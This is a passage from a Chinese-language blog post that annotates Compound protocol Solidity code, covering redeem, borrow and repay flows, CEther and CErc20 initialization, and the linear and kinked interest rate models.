redeemTokensIn;</span><br><span class="line">           redeemAmount = mul_ScalarTruncate(exchangeRate, redeemTokensIn);</span><br><span class="line">       &#125; else &#123; // 如果是给定抵押品量来计算</span><br><span class="line">           redeemTokens = div_(redeemAmountIn, exchangeRate);</span><br><span class="line">           redeemAmount = redeemAmountIn;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // 审计</span><br><span class="line">       uint allowed = comptroller.redeemAllowed(address(this), redeemer, redeemTokens);</span><br><span class="line">       if (allowed != 0) &#123;</span><br><span class="line">           revert RedeemComptrollerRejection(allowed);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (accrualBlockNumber != getBlockNumber()) &#123;</span><br><span class="line">           revert RedeemFreshnessCheck();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // 如果Compound没有足够的金额提现，则revert</span><br><span class="line">       if (getCashPrior() &lt; redeemAmount) &#123;</span><br><span class="line">           revert RedeemTransferOutNotPossible();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">// 写入：修改信息</span><br><span class="line">       totalSupply = totalSupply - redeemTokens;</span><br><span class="line">       accountTokens[redeemer] = accountTokens[redeemer] - redeemTokens;</span><br><span class="line"></span><br><span class="line">// 写入：从合约中转出指定数量的资产到用户地址。</span><br><span class="line">       doTransferOut(redeemer, redeemAmount);</span><br><span class="line"></span><br><span class="line">       emit Transfer(redeemer, address(this), redeemTokens);</span><br><span class="line">       emit Redeem(redeemer, redeemAmount, redeemTokens);</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="借款"><a href="#借款" class="headerlink" title="借款"></a>借款</h4><p><code>borrowInternal()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function borrowInternal(uint borrowAmount) internal nonReentrant &#123;</span><br><span class="line">    accrueInterest(); // 计算利息</span><br><span class="line">    // borrowFresh emits borrow-specific logs on errors, so we don&#x27;t need to</span><br><span class="line">    borrowFresh(payable(msg.sender), borrowAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>borrowFresh()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">  function borrowFresh(address payable borrower, uint borrowAmount) internal &#123;</span><br><span class="line">      // 审计</span><br><span class="line">      uint allowed = comptroller.borrowAllowed(address(this), borrower, borrowAmount);</span><br><span class="line">      if (allowed != 0) &#123;</span><br><span class="line">          revert BorrowComptrollerRejection(allowed);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">// 验证当前区块高度是否等于市场保存的区块高度。如果不一致则抛出异常。</span><br><span class="line">      if (accrualBlockNumber != getBlockNumber()) &#123;</span><br><span class="line">          revert BorrowFreshnessCheck();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // Compound不够钱借款了</span><br><span class="line">      if (getCashPrior() &lt; borrowAmount) &#123;</span><br><span class="line">          revert BorrowCashNotAvailable();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">// 计算：查看之前借款的金额，更新借款金额</span><br><span class="line">// 用户最新的借款金额 = 用户的借款金额 * 市场借款指数 / 用户的借款指数</span><br><span class="line">// accountBorrowsPrev：之前借款总数，包括利息。具体过程如下：</span><br><span class="line">//   1.获取包含账户借款余额和借款指数信息的借款快照。</span><br><span class="line">//     BorrowSnapshot storage borrowSnapshot = accountBorrows[account];</span><br><span class="line">//   2.如果用户已借款数量为0，则立即返回。</span><br><span class="line">//     if (borrowSnapshot.principal == 0) return (MathError.NO_ERROR, 0);</span><br><span class="line">//   3.计算用户最新的借款金额，并返回借款余额。</span><br><span class="line">//     mulUInt()、divUInt()、return (MathError.NO_ERROR, result);</span><br><span class="line">      uint accountBorrowsPrev = borrowBalanceStoredInternal(borrower);</span><br><span class="line">      uint accountBorrowsNew = accountBorrowsPrev + borrowAmount;</span><br><span class="line">      // 更新Compound的借款总数</span><br><span class="line">      uint totalBorrowsNew = totalBorrows + borrowAmount;</span><br><span class="line"></span><br><span class="line">// 写入：更新借款信息</span><br><span class="line">      accountBorrows[borrower].principal = accountBorrowsNew;</span><br><span class="line">      accountBorrows[borrower].interestIndex = borrowIndex;</span><br><span class="line">      totalBorrows = totalBorrowsNew;</span><br><span class="line"></span><br><span class="line">// 将Token从货币市场转入指定金额到用户地址。</span><br><span class="line">      doTransferOut(borrower, borrowAmount);</span><br><span class="line"></span><br><span class="line">      emit Borrow(borrower, borrowAmount, accountBorrowsNew, totalBorrowsNew);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="还款"><a href="#还款" class="headerlink" title="还款"></a>还款</h4><p><code>repayBorrowInternal()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function repayBorrowInternal(uint repayAmount) internal nonReentrant &#123;</span><br><span class="line">    accrueInterest(); // 计算利息</span><br><span class="line">    // repayBorrowFresh emits repay-borrow-specific logs on errors, so we don&#x27;t need to</span><br><span class="line">    repayBorrowFresh(msg.sender, msg.sender, repayAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>repayBorrowFresh()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// @notice 还债：任何人都可以帮助你还债</span><br><span class="line">   // @param payer the account paying off the borrow</span><br><span class="line">   // @param borrower the account with the debt being payed off</span><br><span class="line">   // @param repayAmount the amount of underlying tokens being returned, or -1 for the full outstanding amount</span><br><span class="line">  function repayBorrowFresh(address payer, address borrower, uint repayAmount) internal returns (uint) &#123;</span><br><span class="line">      // 审计</span><br><span class="line">      uint allowed = comptroller.repayBorrowAllowed(address(this), payer, borrower, repayAmount);</span><br><span class="line">      if (allowed != 0) &#123;</span><br><span class="line">          revert RepayBorrowComptrollerRejection(allowed);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">// 验证当前区块高度是否等于市场保存的区块高度。如果不一致则抛出异常。</span><br><span class="line">      if (accrualBlockNumber != getBlockNumber()) &#123;</span><br><span class="line">          revert RepayBorrowFreshnessCheck();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // 计算：用户的借款总数，包括利息</span><br><span class="line">      uint accountBorrowsPrev = borrowBalanceStoredInternal(borrower);</span><br><span class="line"></span><br><span class="line">      // 如果还款参数为-1，即uint256的最大值，则代表我们要还完所有负债，否则偿还部分金额。</span><br><span class="line">      uint repayAmountFinal = repayAmount == type(uint).max ? accountBorrowsPrev : repayAmount;</span><br><span class="line"></span><br><span class="line">// 还钱：从还款地址中转入指定金额到货币市场。</span><br><span class="line">      uint actualRepayAmount = doTransferIn(payer, repayAmountFinal);</span><br><span class="line"></span><br><span class="line">// 计算：还款信息</span><br><span class="line">      uint accountBorrowsNew = accountBorrowsPrev - actualRepayAmount;</span><br><span class="line">      uint totalBorrowsNew = totalBorrows - actualRepayAmount;</span><br><span class="line"></span><br><span class="line">      // 写入：还款信息</span><br><span class="line">      accountBorrows[borrower].principal = accountBorrowsNew;</span><br><span class="line">      accountBorrows[borrower].interestIndex = borrowIndex;</span><br><span class="line">      // 更新Compound的总借款信息</span><br><span class="line">      totalBorrows = totalBorrowsNew;</span><br><span class="line"></span><br><span class="line">      emit RepayBorrow(payer, borrower, actualRepayAmount, accountBorrowsNew, totalBorrowsNew);</span><br><span class="line"></span><br><span class="line">      return actualRepayAmount;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>调用者帮借款人还款</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function repayBorrowBehalfInternal(address borrower, uint repayAmount) internal nonReentrant &#123;</span><br><span class="line">    accrueInterest(); // 计算利率</span><br><span class="line">    // repayBorrowFresh emits repay-borrow-specific logs on errors, so we don&#x27;t need to</span><br><span class="line">    repayBorrowFresh(msg.sender, borrower, repayAmount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结：存款、取款、借款、还款的逻辑大致就是计算利率、审计检查、转入转出</p><h3 id="CEther-sol"><a href="#CEther-sol" class="headerlink" title="CEther.sol"></a>CEther.sol</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// initialExchangeRateMantissa_ The initial exchange rate, scaled by 1e18</span><br><span class="line">   constructor(ComptrollerInterface comptroller_,</span><br><span class="line">               InterestRateModel interestRateModel_,</span><br><span class="line">               uint initialExchangeRateMantissa_,</span><br><span class="line">               string memory name_,</span><br><span class="line">               string memory symbol_,</span><br><span class="line">               uint8 decimals_,</span><br><span class="line">               address payable admin_) &#123;</span><br><span class="line">       // 管理员是msg.sender，初始化工作需要是admin才能做</span><br><span class="line">       admin = payable(msg.sender);</span><br><span class="line"></span><br><span class="line">// 调用父合约的initialize()进行初始化</span><br><span class="line">       initialize(comptroller_, interestRateModel_, initialExchangeRateMantissa_, name_, symbol_, decimals_);</span><br><span class="line"></span><br><span class="line">       // 重新设置真正的admin</span><br><span class="line">       admin = admin_;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>initialize()</code>又跑到了CToken.sol中去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">// 初始化某个token市场</span><br><span class="line">   function initialize(ComptrollerInterface comptroller_,</span><br><span class="line">                       InterestRateModel interestRateModel_,</span><br><span class="line">                       uint initialExchangeRateMantissa_,</span><br><span class="line">                       string memory name_,</span><br><span class="line">                       string memory symbol_,</span><br><span class="line">                       uint8 decimals_) public &#123;</span><br><span class="line">       // 必须是admin才能初始化，因此在CEther.sol中我们先是将admin给了msg.sender</span><br><span class="line">       require(msg.sender == admin, &quot;only admin may initialize the market&quot;);</span><br><span class="line">       // 保证只初始化了一次</span><br><span class="line">       require(accrualBlockNumber == 0 &amp;&amp; borrowIndex == 0, &quot;market may only be initialized once&quot;);</span><br><span class="line"></span><br><span class="line">       // 设置exchange rate（汇率），并且不能为0</span><br><span class="line">       initialExchangeRateMantissa = initialExchangeRateMantissa_;</span><br><span class="line">       require(initialExchangeRateMantissa &gt; 0, &quot;initial exchange rate must be greater than zero.&quot;);</span><br><span class="line"></span><br><span class="line">       // Set the comptroller.用于审计</span><br><span class="line">       uint err = _setComptroller(comptroller_);</span><br><span class="line">       require(err == NO_ERROR, &quot;setting comptroller failed&quot;);</span><br><span class="line"></span><br><span class="line">       // 初始化计算利息的区块号和borrow index</span><br><span class="line">       accrualBlockNumber = getBlockNumber(); // 会获取当前区块号</span><br><span class="line">       borrowIndex = mantissaOne; // mantissaOne 为一个 1e18 常量。</span><br><span class="line"></span><br><span class="line">       // 设置利率模型</span><br><span class="line">       //    1. 函数首先检查调用者为管理员，应计息区块号和当前区块号相同（确保是在同一个区块内进行设置的）</span><br><span class="line">//    2. 然后保存当前利率模型合约地址到一个临时变量中，并检查新的地址为利率模型合约</span><br><span class="line">//    3. 然后保存新的利率模型合约到利率模型合约状态变量中</span><br><span class="line">//    4. 最后发出 NewMarketInterestRateModel 事件。</span><br><span class="line">       err = _setInterestRateModelFresh(interestRateModel_);</span><br><span class="line">       require(err == NO_ERROR, &quot;setting interest rate model failed&quot;);</span><br><span class="line"></span><br><span class="line">// 设置这个token的一系列常规信息</span><br><span class="line">       name = name_;</span><br><span class="line">       symbol = symbol_;</span><br><span class="line">       decimals = decimals_;</span><br><span class="line"></span><br><span class="line">       _notEntered = true; // 用于防止再次调用，重入之类</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h4 id="mint"><a href="#mint" class="headerlink" title="mint()"></a>mint()</h4><p>存款函数会新增 cToken 数量，即 totalSupply 增加了，就等于挖矿了 cToken。该操作会同时将用户的标的资产转入 cToken 合约中（数据会存储在代理合约中），并根据最新的兑换率将对应的 cToken 代币转到用户钱包地址。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function mint() external payable &#123; mintInternal(msg.value);&#125;</span><br></pre></td></tr></table></figure><p>之后会进入到CToken.sol的<code>mintInternal()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//@notice Sender supplies assets into the market and receives cTokens in </span><br><span class="line">   function mintInternal(uint mintAmount) internal nonReentrant &#123;</span><br><span class="line">       accrueInterest(); // 计算新利息,出现错误会抛出异常</span><br><span class="line">       mintFresh(msg.sender, mintAmount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>再进入CToken.sol存款函数的<code>accrueInterest()</code>：</p><p>最后进入CToken.sol存款函数的<code>mintFresh()</code></p><h4 id="redeem"><a href="#redeem" class="headerlink" title="redeem()"></a>redeem()</h4><p>然后进入CToken.sol取款函数的<code>mintInternal()</code>方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function mint() external payable &#123;mintInternal(msg.value);&#125;</span><br></pre></td></tr></table></figure><h4 id="borrow"><a href="#borrow" class="headerlink" title="borrow()"></a>borrow()</h4><p>然后进入CToken.sol借款的<code>borrow()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function borrow(uint borrowAmount) external returns (uint) &#123;</span><br><span class="line">    borrowInternal(borrowAmount);</span><br><span class="line">    return NO_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="repayBorrow"><a href="#repayBorrow" class="headerlink" title="repayBorrow()"></a>repayBorrow()</h4><p>然后进入CToken.sol还款的<code>repayBorrowInternal()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function repayBorrow() external payable &#123;repayBorrowInternal(msg.value);&#125;</span><br></pre></td></tr></table></figure><h4 id="repayBorrowBehalf"><a href="#repayBorrowBehalf" class="headerlink" title="repayBorrowBehalf()"></a>repayBorrowBehalf()</h4><p>帮别人还钱，进入到CToken.sol还款的<code>repayBorrowBehalfInternal()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function repayBorrowBehalf(address borrower) external payable &#123;repayBorrowBehalfInternal(borrower, msg.value);&#125;</span><br></pre></td></tr></table></figure><h3 id="CErc20-sol"><a href="#CErc20-sol" class="headerlink" title="CErc20.sol"></a>CErc20.sol</h3><p>Coumpound 会为每个 ERC20 代币部署一个货币市场，同时会生成相应的 cToken，比如 DAI 对应的 cToken 就叫 cDAI。ERC20 货币市场采用的是代理模式，以此方便某个 ERC20 代币的升级</p><h4 id="初始化-1"><a href="#初始化-1" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function initialize(address underlying_,</span><br><span class="line">                    ComptrollerInterface comptroller_,</span><br><span class="line">                    InterestRateModel interestRateModel_,</span><br><span class="line">                    uint initialExchangeRateMantissa_,</span><br><span class="line">                    string memory name_,</span><br><span class="line">                    string memory symbol_,</span><br><span class="line">                    uint8 decimals_) public &#123;</span><br><span class="line">    // 调用父合约的初始化函数进行初始化设置</span><br><span class="line">    // 实例了这个底层代币</span><br><span class="line">    super.initialize(comptroller_, interestRateModel_, initialExchangeRateMantissa_, name_, symbol_, decimals_);</span><br><span class="line"></span><br><span class="line">    // 保存对应的底层基础代币</span><br><span class="line">    underlying = underlying_;</span><br><span class="line">    // 获取它的余额来检查底层代币是否OK</span><br><span class="line">    EIP20Interface(underlying).totalSupply();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利率模型"><a href="#利率模型" class="headerlink" title="利率模型"></a>利率模型</h2><p>包括两个模型</p><ul><li>直线型利率模型：<code>WhitePaperInterestRateModel</code></li><li>拐点型利率模型：<code>JumpRateModel</code>和<code>JumpRateModelV2</code>两个不同版本的实现，曾经使用 <code>JumpRateModel</code> 的都已经升级为 <code>JumpRateModelV2</code>。所以我就直接研究 <code>JumpRateModelV2</code> 。</li></ul><h3 id="InterestRateModel-sol"><a href="#InterestRateModel-sol" class="headerlink" title="InterestRateModel.sol"></a>InterestRateModel.sol</h3><p>非常简单，只定义了一个变量和两个方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">abstract contract InterestRateModel &#123;</span><br><span class="line"></span><br><span class="line">    bool public constant isInterestRateModel = true;</span><br><span class="line"></span><br><span class="line">// 计算: 每个区块的当前借款利率</span><br><span class="line">    function getBorrowRate(uint cash, uint borrows, uint reserves) virtual external view returns (uint);</span><br><span class="line">    </span><br><span class="line">    // 计算: 每个区块的当前存储利率</span><br><span class="line">    function getSupplyRate(uint cash, uint borrows, uint reserves, uint reserveFactorMantissa) virtual external view returns (uint);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="WhitePaperInterestRateModel-sol"><a href="#WhitePaperInterestRateModel-sol" class="headerlink" title="WhitePaperInterestRateModel.sol"></a>WhitePaperInterestRateModel.sol</h3><h4 id="初始化-2"><a href="#初始化-2" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">y = k*x + b</span><br><span class="line">其中，k 为斜率，b 是 x 为 0 时的起点值，x 是自变量，在这里表示资金利用率，y 是因变量，表示借款利率。</span><br></pre></td></tr></table></figure><p>在构造时候要指定基础的年化利率和利率的增长速度</p><ul><li><code>baseRatePerYear</code> 表示基础的年化利率，对应的 <code>baseRatePerBlock</code> 表示区块级利率，对应公式中的截矩 <code>b</code>。</li><li><code>multiplierPerYear</code> 表示利率的增长速度，对应的 <code>multiplierPerBlock</code> 表示利率的增长速度，也就是公式中的斜率 <code>k</code></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">constructor(uint baseRatePerYear, uint multiplierPerYear) public &#123;</span><br><span class="line">    baseRatePerBlock = baseRatePerYear / blocksPerYear;</span><br><span class="line">    multiplierPerBlock = multiplierPerYear / blocksPerYear;</span><br><span class="line"></span><br><span class="line">    emit NewInterestParams(baseRatePerBlock, multiplierPerBlock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用率"><a href="#利用率" class="headerlink" title="利用率"></a>利用率</h4><p>存储利率和贷款利率都要用到利用率。</p><p>如果借款金额为0时，利用率为0，否则利用率就等于 <code>总借款 / (资金池余额 + 总借款 - 储备金)</code>，代码中 <code>mul(1e18)</code> 是为了保持结果的精度。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function utilizationRate(uint cash, uint borrows, uint reserves) public pure returns (uint) &#123;</span><br><span class="line">    if (borrows == 0) return 0;</span><br><span class="line">    return borrows * BASE / (cash + borrows - reserves);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="借款利率"><a href="#借款利率" class="headerlink" title="借款利率"></a>借款利率</h4><p>首先求出利用率，然后根据直线公式 <code>区块级的利率增长速度 * 利用率 + 区块级的基础利率</code> 算出借款利率。</p><p>这里 <code>/ BASE</code> 是因为利用率和区块级的利率增长速度本身都已经扩为高精度整数了，相乘之后精度变成 36 了，所以再除以 BASE 就可以把精度降回 18。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function getBorrowRate(uint cash, uint borrows, uint reserves) override public view returns (uint) &#123;</span><br><span class="line">    uint ur = utilizationRate(cash, borrows, reserves);</span><br><span class="line">    return (ur * multiplierPerBlock / BASE) + baseRatePerBlock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="存款利率"><a href="#存款利率" class="headerlink" title="存款利率"></a>存款利率</h4><p>整理出来就是 <code>资金利用率 * 借款利率 * (1 - 储备金率)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function getSupplyRate(uint cash, uint borrows, uint reserves, uint reserveFactorMantissa) override public view returns (uint) &#123;</span><br><span class="line">    uint oneMinusReserveFactor = BASE - reserveFactorMantissa;</span><br><span class="line">    uint borrowRate = getBorrowRate(cash, borrows, reserves);</span><br><span class="line">    uint rateToPool = borrowRate * oneMinusReserveFactor / BASE;</span><br><span class="line">    return utilizationRate(cash, borrows, reserves) * rateToPool / BASE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="BaseJumpRateModelV2-sol"><a href="#BaseJumpRateModelV2-sol" class="headerlink" title="BaseJumpRateModelV2.sol"></a>BaseJumpRateModelV2.sol</h3><h4 id="状态变量"><a href="#状态变量" class="headerlink" title="状态变量"></a>状态变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">uint256 private constant BASE = 1e18; // 小数点位数，用于计算,因为solidity没有小数</span><br><span class="line"></span><br><span class="line">   address public owner; // Timelock 合约</span><br><span class="line"></span><br><span class="line">   uint public constant blocksPerYear = 2102400; // 一年大概的区块数，用于计算年利率</span><br><span class="line"></span><br><span class="line">   uint public multiplierPerBlock; // 公式 y = k * x 中的斜率 k 值</span><br><span class="line"></span><br><span class="line">   uint public baseRatePerBlock; // 利率初始值，一开始为0</span><br><span class="line"></span><br><span class="line">   uint public jumpMultiplierPerBlock; // 拐点后的斜率 k 值</span><br><span class="line"></span><br><span class="line">   uint public kink; // 拐点值，也就是资金利用率到了多少就拐点了，比如是80%。</span><br></pre></td></tr></table></figure><h4 id="初始化-3"><a href="#初始化-3" class="headerlink" title="初始化"></a>初始化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  constructor(uint baseRatePerYear, uint multiplierPerYear, uint jumpMultiplierPerYear, uint kink_, address owner_) internal &#123;</span><br><span class="line">      owner = owner_;</span><br><span class="line">// 使用父合约的构造函数</span><br><span class="line">      updateJumpRateModelInternal(baseRatePerYear,  multiplierPerYear, jumpMultiplierPerYear, kink_);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>然后调用了<code>updateJumpRateModelInternal()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function updateJumpRateModelInternal(uint baseRatePerYear, uint multiplierPerYear, uint jumpMultiplierPerYear, uint kink_) internal &#123;</span><br><span class="line">// 拐点利用率之前，直线的截矩 b</span><br><span class="line">    baseRatePerBlock = baseRatePerYear / blocksPerYear;</span><br><span class="line">    // 拐点利用率之前，直线的斜率 k。</span><br><span class="line">    // 注意这里的 k，与直接型利率模型中的有一些细微的不同。</span><br><span class="line">    multiplierPerBlock = (multiplierPerYear * BASE) / (blocksPerYear * kink_);</span><br><span class="line">    // 拐点利用率之后，直线的斜率 k2</span><br><span class="line">    jumpMultiplierPerBlock = jumpMultiplierPerYear / blocksPerYear;</span><br><span class="line">    // 拐点时的资产利用率</span><br><span class="line">    kink = kink_;</span><br><span class="line"></span><br><span class="line">    emit NewInterestParams(baseRatePerBlock, multiplierPerBlock, jumpMultiplierPerBlock, kink);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="利用率-1"><a href="#利用率-1" class="headerlink" title="利用率"></a>利用率</h4><p>无论是直线利率模型，还是拐点型利率模型，在计算利用率时都是一样</p><h4 id="借款利率-1"><a href="#借款利率-1" class="headerlink" title="借款利率"></a>借款利率</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// 计算区块的借款利息</span><br><span class="line">   function getBorrowRateInternal(uint cash, uint borrows, uint reserves) internal view returns (uint) &#123;</span><br><span class="line">   // 计算：资产利用率</span><br><span class="line">       uint util = utilizationRate(cash, borrows, reserves);</span><br><span class="line"></span><br><span class="line">       if (util &lt;= kink) &#123; // 如果资金使用率没超过拐点</span><br><span class="line">           return ((util * multiplierPerBlock) / BASE) + 